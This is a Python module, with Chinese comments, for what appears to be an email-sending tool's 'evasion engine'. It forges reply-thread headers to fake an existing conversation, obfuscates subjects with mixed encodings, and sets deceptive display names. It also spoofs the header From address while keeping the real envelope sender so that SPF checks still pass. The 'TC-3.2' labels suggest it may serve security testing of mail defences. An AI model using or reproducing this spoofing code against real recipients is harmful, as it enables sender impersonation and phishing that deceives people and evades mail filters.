# -*- coding: utf-8 -*-
"""伪装技术引擎：四种伪装手法（线程劫持/混合编码/显示混淆/发件人伪装）"""
from __future__ import annotations
import copy
import random
import re
from email.header import Header
from email.utils import formataddr
from typing import Any, Dict, List, Optional, Tuple
from .models import SendTask, EvasionConfig
from .utils import random_hex, random_msgid, inject_zero_width, apply_homoglyphs, encode_mixed_subject, make_thread_index, jitter_date, _random_helo_domain


class EvasionEngine:
    @staticmethod
    def apply(task: SendTask, cfg: EvasionConfig, target_domain: str) -> SendTask:
        t = cfg.technique
        if t == "none":
            return task
        task = copy.deepcopy(task)
        if t in ("thread_hijack", "combined"):
            task = EvasionEngine._apply_thread_hijack(task, cfg, target_domain)
        if t in ("mixed_encoding", "combined"):
            task = EvasionEngine._apply_mixed_encoding(task, cfg)
        if t in ("display_ambiguity", "combined"):
            task = EvasionEngine._apply_display_ambiguity(task, cfg, target_domain)
        if t in ("sender_spoof", "combined"):
            task = EvasionEngine._apply_sender_spoof(task, cfg, target_domain)
        return task

    @staticmethod
    def _apply_thread_hijack(task: SendTask, cfg: EvasionConfig,
                              target_domain: str) -> SendTask:
        task.from_name = cfg.thread_sender_name
        fake_msgid = random_msgid(target_domain)
        task.subject = f"{cfg.thread_prefix}{cfg.thread_topic}"
        task.extra_headers.update({
            "In-Reply-To": fake_msgid,
            "References": f"{random_msgid(target_domain)} {fake_msgid}",
            "Thread-Topic": cfg.thread_topic,
            "Thread-Index": make_thread_index(),
        })
        return task

    @staticmethod
    def _apply_mixed_encoding(task: SendTask, cfg: EvasionConfig) -> SendTask:
        task.subject = encode_mixed_subject(cfg.enc_b64_part, cfg.enc_qp_part)
        return task

    @staticmethod
    def _apply_display_ambiguity(task: SendTask, cfg: EvasionConfig,
                                  target_domain: str) -> SendTask:
        # 使用自定义域名，如果为空则使用收件人域名
        domain = cfg.ambiguity_domain.strip() if cfg.ambiguity_domain.strip() else target_domain
        fake_addr = f"{cfg.ambiguity_user}@{domain}"
        # 如果设置了 Unicode 显示名，则使用它替代整个 from_name
        if cfg.unicode_display_name.strip():
            task.from_name = cfg.unicode_display_name.strip()
        else:
            task.from_name = f"{fake_addr} ({cfg.ambiguity_label})"
        return task

    @staticmethod
    def _apply_sender_spoof(task: SendTask, cfg: EvasionConfig,
                             target_domain: str) -> SendTask:
        """TC-3.2: 发件人伪装 — Envelope/Header From 分离。

        原理: SMTP 协议的 MAIL FROM (信封发件人) 保持为真实 SMTP 账号，
        确保 SPF 验证通过。但邮件头中的 From: 字段替换为伪造地址，
        让收件人在客户端看到伪造的发件人。

        辅助伪装: Message-ID 域名也使用伪造域名，增强一致性。
        """
        spoof_addr = cfg.spoof_from_address.strip()
        if not spoof_addr:
            return task

        # 设置伪造的 From 地址
        task.spoof_from_addr = spoof_addr

        # 设置伪造的显示名（如果配置了）
        spoof_name = cfg.spoof_from_name.strip()
        if spoof_name:
            task.from_name = spoof_name

        # 伪造域名用于 Message-ID 和引用头
        spoof_domain = spoof_addr.split("@")[-1] if "@" in spoof_addr else target_domain
        task.extra_headers["Message-ID"] = random_msgid(spoof_domain)

        return task

    @staticmethod
    def describe_effects(cfg: EvasionConfig, target_domain: str = "gmail.com") -> List[Dict[str, str]]:
        """描述伪装技术对邮件各字段的修改效果，用于演示预览。"""
        effects = []
        t = cfg.technique
        if t == "none":
            return [{"field": "无", "before": "-", "after": "未启用任何伪装技术"}]

        if t in ("thread_hijack", "combined"):
            fake_msgid = random_msgid(target_domain)
            effects.append({
                "field": "From 显示名",
                "before": "(使用原始发件人名称)",
                "after": cfg.thread_sender_name,
            })
            effects.append({
                "field": "Subject 主题",
                "before": "(使用原始主题)",
                "after": f"{cfg.thread_prefix}{cfg.thread_topic}",
            })
            effects.append({
                "field": "In-Reply-To",
                "before": "(无)",
                "after": fake_msgid,
            })
            effects.append({
                "field": "Thread-Topic",
                "before": "(无)",
                "after": cfg.thread_topic,
            })
            effects.append({
                "field": "Thread-Index",
                "before": "(无)",
                "after": make_thread_index(),
            })

        if t in ("mixed_encoding", "combined"):
            encoded = encode_mixed_subject(cfg.enc_b64_part, cfg.enc_qp_part)
            effects.append({
                "field": "Subject (编码后)",
                "before": f"{cfg.enc_b64_part}{cfg.enc_qp_part}",
                "after": encoded,
            })

        if t in ("display_ambiguity", "combined"):
            domain = cfg.ambiguity_domain.strip() if cfg.ambiguity_domain.strip() else target_domain
            fake_addr = f"{cfg.ambiguity_user}@{domain}"
            if cfg.unicode_display_name.strip():
                display_name = cfg.unicode_display_name.strip()
                effects.append({
                    "field": "From 显示名 (Unicode伪装)",
                    "before": "(使用原始发件人名称)",
                    "after": display_name,
                })
            else:
                effects.append({
                    "field": "From 显示名",
                    "before": "(使用原始发件人名称)",
                    "after": f"{fake_addr} ({cfg.ambiguity_label})",
                })
            effects.append({
                "field": "伪造地址",
                "before": f"(使用收件人域名: {target_domain})",
                "after": fake_addr,
            })

        if t in ("sender_spoof", "combined"):
            spoof_addr = cfg.spoof_from_address.strip()
            spoof_name = cfg.spoof_from_name.strip()
            if spoof_addr:
                spoof_domain = spoof_addr.split("@")[-1] if "@" in spoof_addr else target_domain
                effects.append({
                    "field": "From 地址 (TC-3.2)",
                    "before": "(使用真实 SMTP 账号地址)",
                    "after": spoof_addr,
                })
                if spoof_name:
                    effects.append({
                        "field": "From 显示名 (TC-3.2)",
                        "before": "(使用原始发件人名称)",
                        "after": spoof_name,
                    })
                effects.append({
                    "field": "MAIL FROM (信封)",
                    "before": "(与 From 头一致)",
                    "after": "(保持真实 SMTP 账号，确保 SPF PASS)",
                })
                effects.append({
                    "field": "Message-ID 域名",
                    "before": "(使用真实发件人域名)",
                    "after": f"@{spoof_domain}",
                })
                effects.append({
                    "field": "Return-Path",
                    "before": "(显式设置为真实账号)",
                    "after": "(移除，由接收方 MTA 自动生成)",
                })
            else:
                effects.append({
                    "field": "TC-3.2 发件人伪装",
                    "before": "-",
                    "after": "(未配置伪造地址，跳过)",
                })

        return effects